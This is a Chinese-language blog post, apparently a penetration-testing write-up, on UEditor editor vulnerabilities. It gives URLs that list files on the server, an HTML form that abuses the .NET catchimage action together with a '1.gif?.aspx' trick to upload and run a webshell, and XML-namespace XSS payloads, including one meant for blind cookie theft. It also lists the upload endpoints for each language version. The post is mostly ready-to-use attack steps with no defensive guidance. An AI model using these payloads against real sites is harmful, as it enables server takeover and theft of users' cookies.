---
title: "Ueditor 漏洞导致 Getshell"
slug: ueditor-vulnerability-causes-getshell
url: /2019/ueditor-vulnerability-causes-getshell.html
date: 2019-12-20 12:50:05
categories: ["网络安全"]
tags: ["Web 渗透", "Ueditor", "文件上传", "XSS", "Getshell"]
toc: true
draft: false
---

聊聊最近用到的 `ueditor` 其中的几个漏洞。

![ueditor-1](https://oss.zjun.info/zjun.info/ueditor-1.webp)

## 0x01 文件读取漏洞

file 目录文件读取：<http://www.xxxx.com/ueditor/net/controller.ashx?action=listfile>

image 目录文件读取：<http://www.xxxx.com/ueditor/net/controller.ashx?action=listimage>

## 0x02 任意文件上传漏洞

只适用于 `.NET 版本`

准备一台服务区存放图片码或者需要上传的文件，本地构造一个 `html` 页面用于上传使用

```html
<form action="http://www.xxxx.com/ueditor/net/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded" method="POST">

    <p>shell addr: <input type="text" name="source[]" /></p>

    <input type="submit" value="Submit" />

</form>
```

![ueditor-2](https://oss.zjun.info/zjun.info/ueditor-2.webp)

`shell addr` 处填写服务器上图片码地址，构造成以下格式，绕过上传使其解析为 `aspx`

```html
http://xxxx/1.gif?.aspx
```

成功上传返回上传路径，可直连 `getshell`

![ueditor-3](https://oss.zjun.info/zjun.info/ueditor-3.webp)

## 0x03 xss 漏洞

虽然存在但用处不大，既然可以直接上传为何不直传码，而用 xss 呢，有些鸡肋。

xml_xss

```html
<html>

<head></head>

<body>
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>

</html>

盲打 Cookie、src=""：
<something:script src="" xmlns:something="http://www.w3.org/1999/xhtml"></something:script>
```

上传点，以编写语言不同。

```bash
/ueditor/index.html
/ueditor/asp/controller.asp?action=uploadimage
/ueditor/asp/controller.asp?action=uploadfile

/ueditor/net/controller.ashx?action=uploadimage
/ueditor/net/controller.ashx?action=uploadfile

/ueditor/php/controller.php?action=uploadfile
/ueditor/php/controller.php?action=uploadimage

/ueditor/jsp/controller.jsp?action=uploadfile
/ueditor/jsp/controller.jsp?action=uploadimage
```

![ueditor-4](https://oss.zjun.info/zjun.info/ueditor-4.webp)

上传成功，访问成功弹框

![ueditor-5](https://oss.zjun.info/zjun.info/ueditor-5.webp)
